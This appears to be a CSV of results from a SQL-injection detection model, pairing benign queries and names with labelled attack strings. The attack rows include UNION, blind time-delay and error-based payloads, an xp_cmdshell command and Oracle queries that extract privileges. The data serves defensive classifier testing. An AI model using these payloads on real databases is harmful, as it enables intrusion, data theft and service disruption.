text,true_label,predicted_label,confidence_sql_injection
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1,1,1.0
sweldund-pasetti@supercover.lt,0,0,0.006527024015406931
select * from wing where captain = 'man' limit 3,0,0,0.0
select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,1,1,1.0
"1"" where 8016  =  8016",1,1,1.0
"  select health as quite, border as [duty]  from musical",0,0,0.0
select count ( thouid ) from chamber,0,0,0.0
paley,0,0,0.004468253314358248
select * from party where announced between 'trail' and 'forest',0,0,0.0
sangres,0,0,0.004468253314358248
"  select seriousid as id, law as doll from view",0,0,0.0
de las muecas pedrol,0,0,0.0
7118,0,0,0.004468253314358248
"   select decide, cattle, daughter from ants where organization  is null",0,0,0.0
"lugar higuera canaria, 169",0,0,0.004468253314358248
select top 3 * from instant,0,0,0.0
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe",1,1,1.0
select bright ( s )  from nation union,0,0,0.0
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"  update effort set noise =  'process', city =  'smaller' where strong =  sets",0,0,0.0
"-5148""   )    )    or 5310  =  8229",1,1,1.0
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1,1,1.0
"1',  (  case when 5204  =  2136 then 1 else null end  )  ",1,1,1.0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,1,0.92
"   select form, copy, sawfrom why where fat  is not null",0,0,0.0
"select instr ( ""w3schools.com"", ""com"" )  as matchposition;",0,0,0.0
select sleep  (  5   )    )   ||',1,1,0.98
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1,1,1.0
spaeth@directoriogratuito.kr,0,0,0.004468253314358248
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""vukd""  =  ""vukd",1,1,1.0
select top 3 * from careful where interest = 'beyond' select * from fence,0,0,0.0
"""  )  ;waitfor delay '0:0:__time__'--",1,1,0.95
select top 3 * from drew,0,0,0.0
select * from park where tried  between 10 and 20,0,0,0.0
select * from can  where widely not like '[meant]%',0,0,0.0
"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 21 )  order by meta_id asc",0,0,0.01
-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,1,1,1.0
cella,0,0,0.004468253314358248
julieta,0,0,0.004468253314358248
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1,1,1.0
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"1 where 2751  =  2751 union all select null,null,null,null--",1,1,1.0
select * from rice where forget = 'shout',0,0,0.0
1'+  (  select 'kiqf' where 5920  =  5920,1,1,1.0
"  select orders.shadowrid, employees.becoming, employees.please from ordersright join employees on orders.employeeid  =  employees.seeid order by orders.nestid",0,0,0.0
"  select until,bill from chamber where system = 'voice' union select only, pay from battle",0,0,0.0
select top 3 * from several where stomach = 'letter' select * from any,0,0,0.0
"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
ferris,0,0,0.004468253314358248
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1,1,0.99
"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,1,1.0
bscones de ojeda,0,0,0.0
magdiel,0,0,0.004468253314358248
select * from sit,0,0,0.0
select * from tales where mark = 'curious'  or out = 'damage',0,0,0.0
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",1,1,1.0
"  select enemyid as id, kill as ride from dollar",0,0,0.0
8759,0,0,0.004468253314358248
delete from engine where size = 'straight',0,0,0.0
select * from population order by page desc,0,0,0.0
" select * from users where id  =  '1' or \<   =  1 union select 1,@@version -- 1'",1,1,1.0
"   select remove, per, handfrom consist where twenty  is not null",0,0,0.0
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,1,1,1.0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,1,1,1.0
select top 50 percent * from prepare,0,0,0.0
-4900'   )    )    or 7208  =  3236,1,1,1.0
"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",1,1,1.0
select top 3 * from flies,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 189 )  order by meta_id asc",0,0,0.0
select count ( something ) from driving,0,0,0.0
28815,0,0,0.004468253314358248
"   select sink, trade, men from fine where move  is null",0,0,0.0
almazn cayul,0,0,0.004468253314358248
select * from layers fetch first 3 rows only select top 50 percent * from below,0,0,0.0
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
select * from difference 3 select * from snow,0,0,0.0
"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
basilia,0,0,0.004468253314358248
1  )   where 2083  =  2083,1,1,1.0
select distinct wonderful from courage,0,0,0.0
03291016s,0,0,0.004468253314358248
"-2007%'   )    )    union all select 7298,7298,7298#",1,1,1.0
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1,1,1.0
fluvia,0,0,0.004468253314358248
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
afiligr*anado,0,0,0.0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",1,1,1.0
select * from  ( select verb from occasionally ) ,0,0,0.0
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1,1,1.0
"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,1,0.99
"-9240' union all select 6538,6538,6538#",1,1,1.0
select * from base fetch first 3 rows only select top 50 percent * from limited,0,0,0.0
"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,1,1.0
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,1,1,1.0
sitiwet-chagas@creacionesacampada.travel,0,0,0.010162907268170427
-3450' where 4478  =  4478 or 9323  =  9323#,1,1,0.99
8534,0,0,0.004468253314358248
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99
"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"   select skill, from, thumb from street where poetry  is null",0,0,0.0
exigidad,0,0,0.004468253314358248
select * from hope where seven = 'solid' fetch first 3 rows only,0,0,0.0
"cuerlas, las",0,0,0.004468253314358248
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",1,1,1.0
3.62194e+15,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",1,1,1.0
"  select wasteid as id, surprise as morning from whole",0,0,0.0
10836981w,0,0,0.004468253314358248
siku@tartasconamor.in,0,0,0.001423800461630333
-7726 or 3038  =  3038,1,1,0.98
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1,1,1.0
cartaya,0,0,0.004468253314358248
comba,0,0,0.004468253314358248
78260205z,0,0,0.004468253314358248
select avg ( lower )  from lunch  select sum ( time ) ,0,0,0.0
select avg ( imagine ) from directly,0,0,0.0
kangelis,0,0,0.004468253314358248
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1,1,0.97
"c/ don bosco 65, 10-d",0,0,0.0
select * from children 3 select * from desert,0,0,0.0
-4323'   )    )    or 6968  =  1393,1,1,1.0
"   select enjoy, necessary, sentence from grain where wrong  is null",0,0,0.0
"1   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   8048  =  8048",1,1,1.0
7.73869e+15,0,0,0.0
select * from promised fetch first 3 rows only,0,0,0.0
1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,1,1,1.0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,1.0
52310665v,0,0,0.004468253314358248
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1,1,1.0
" select * from laugh order by until asc, grandmother desc",0,0,0.0
"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,1,1,1.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  4   )    )    and 'i'  =  'i",1,1,1.0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1,1,1.0
6180,0,0,0.004468253314358248
or sleep  (  __time__  )    =  ',1,1,0.97
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11451 )  order by meta_id asc",0,0,0.0
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",1,1,1.0
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1,1,1.0
"admin"" or 1  =  1--",1,1,1.0
union all select,1,1,0.83
"insert into double ( visitor, sure, donkey, nuts, soldier, press )  values  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ",0,0,0.0
select feet ( s )  from spirit select instant from pay,0,0,0.0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,1.0
"  select shallid as id, pipe as prove from sweet",0,0,0.0
-4428  )   or 3038  =  3038,1,1,1.0
1  )   where 2232  =  2232,1,1,1.0
1'+  (  select wpai where 3685  =  3685,1,1,1.0
gupton,0,0,0.004468253314358248
"insert into gold ( twice, else, post, direct, favorite, wear )  values  ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )  ",0,0,0.05
21700,0,0,0.004468253314358248
select top 3 * from limited select * from wave 3select * from cent,0,0,0.0
rivalee,0,0,0.004468253314358248
"   select employees.tomorrow, count ( orders.silenceid )  as heardfrom    ( ordersinner join store on orders.islandid  =  employees.elseid ) ",0,0,0.0
consell,0,0,0.004468253314358248
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",1,1,1.0
93310194e,0,0,0.004468253314358248
select apart,0,0,0.00024957571886764606
select * from southern where almost = 'broken' limit 3,0,0,0.0
cabrer gascon,0,0,0.004468253314358248
select count ( * )  as studying,0,0,0.0
duplan,0,0,0.004468253314358248
select * from review where torn in  ( select service from invented ) ,0,0,0.0
select region ( s ) from aware inner join,0,0,0.0
6246,0,0,0.004468253314358248
select * from definition,0,0,0.0
1.72e+15,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1,1,1.0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1,1,1.0
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """,1,1,1.0
delete from roof where heat = 'mine',0,0,0.0
j804n86o,0,0,0.004468253314358248
"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"  select orders.relationshiprid, employees.press, employees.natural from ordersright join employees on orders.employeeid  =  employees.planningid order by orders.dogid",0,0,0.0
 update pour set busy = 'sent'where drawn = 'important',0,0,0.0
caball,0,0,0.004468253314358248
" select column_name ( s )  from cream,sit",0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  7   )    )    and 'i'  =  'i",1,1,1.0
"1%'  )   union all select null,null,null,null#",1,1,1.0
select * from individual where situation not like 'ship%',0,0,0.0
select * from farm where split not between 'settlers' and 'flat',0,0,0.0
select * from bottom where clear = 'underline' limit 3,0,0,0.0
select count ( * )  as badly,0,0,0.0
pagny@cpanelweb.yu,0,0,0.004468253314358248
"   select count ( here ) , silver from double by toy",0,0,0.0
tebbe,0,0,0.004468253314358248
" select column_name ( s )  from natural,brother",0,0,0.0
-9014' order by 1--,1,1,1.0
"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",1,1,1.0
select number ( s )  from here full outer join,0,0,0.0
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'tzrd'  =  'tzrd",1,1,1.0
"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select top 50 percent * from went select * from that fetch first 50 percent rows onlyselect top 3 * from ear,0,0,0.0
"el reyezuelo, 15",0,0,0.0
"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",1,1,1.0
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,1,1,1.0
siefert,0,0,0.004468253314358248
"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1,1,1.0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,1,1,1.0
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1,1,1.0
select * from food,0,0,0.0
" select * from users where id  =  1 or \+<$ union select 1,@@version -- 1",1,1,1.0
"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
-3881   )    )     )   union all select 4438--,1,1,1.0
select paper from corn,0,0,0.0
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1,1,1.0
4.46161e+14,0,0,0.0
select * from wp_posts where id  =  262331 limit 1,0,0,0.0
bilal,0,0,0.004468253314358248
select * from customers where rownum < =  3;,0,0,0.02
" select * from strong order by said asc, yard desc",0,0,0.0
artenio,0,0,0.004468253314358248
reski.kuberskaya@n340magazin.no,0,0,0.0002378417525869997
pruja lantadilla,0,0,0.004468253314358248
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1,1,1.0
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",1,1,1.0
select * from farmer where replace = 'split' fetch first 3 rows only,0,0,0.0
"  select frozen as pen, seat as [mistake]  from standard",0,0,0.0
select * from forth where price not between 10 and 20,0,0,0.0
